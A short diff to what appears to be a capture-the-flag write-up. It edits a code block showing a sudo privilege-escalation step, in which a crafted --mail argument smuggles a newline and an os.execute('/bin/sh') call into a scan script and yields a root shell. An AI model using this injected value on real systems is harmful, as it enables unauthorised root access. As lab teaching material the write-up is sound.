@@ -403,8 +403,8 @@ Run the `mail-scan.py` script using the below command:
 sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 --mail $'root@localhost"    \nos.execute("/bin/sh")"'
 ```
 
-```
-e11i0t@team-188-erdosamphetamineaddiction-kali:/home/e11i0t/scripts$ sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 -->
+```bash
+e11i0t@/home/e11i0t/scripts$ sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 -->
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 09:18 UTC
 # root
 # check-pass.py  mail-scan.py  mkcd.py
